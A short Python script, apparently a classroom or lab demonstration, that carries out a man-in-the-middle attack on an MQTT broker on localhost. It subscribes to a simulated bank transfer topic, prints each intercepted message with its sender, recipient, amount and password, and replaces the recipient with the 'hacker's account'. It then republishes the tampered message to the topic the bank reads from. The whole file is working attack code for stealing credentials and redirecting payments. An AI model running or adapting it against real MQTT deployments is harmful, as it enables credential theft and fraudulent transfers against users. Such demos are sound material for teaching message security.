import paho.mqtt.client as mqtt
import json
import time

# Configurações
BROKER = "localhost"
PORT = 1883
TOPIC_ORIGINAL = "banco/transferencia"
TOPIC_REAL = "banco/transferencia_real"  # Canal secreto do banco

print("ATAQUE MAN-IN-THE-MIDDLE ATIVO")
print("=" * 50)
print("Interceptando tópico: " + TOPIC_ORIGINAL)

def on_message(client, userdata, message):
    payload = message.payload.decode()
    dados = json.loads(payload)
    
    print("=== MENSAGEM INTERCEPTADA ===")
    print(f"      De: {dados['de']}")
    print(f"      Para: {dados['para']}")
    print(f"      Valor: R$ {dados['valor']}")
    print(f"      SENHA: {dados['senha']}")
    
    dados['para'] = "🏴‍☠️ Conta do Hacker"
    
    print(f"\n   INTEGRIDADE QUEBRADA:")
    print(f"      Destino alterado para: {dados['para']}")
    print(f"      Valor roubado: R$ {dados['valor']}")
    
    mensagem_modificada = json.dumps(dados)
    client.publish(TOPIC_REAL, mensagem_modificada)
    print(f"   ✅ Mensagem modificada enviada!\n")
    print("=" * 50 + "\n")

client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2, client_id="MITM_Attacker")
client.on_message = on_message
client.connect(BROKER, PORT)
client.subscribe(TOPIC_ORIGINAL)

client.loop_forever()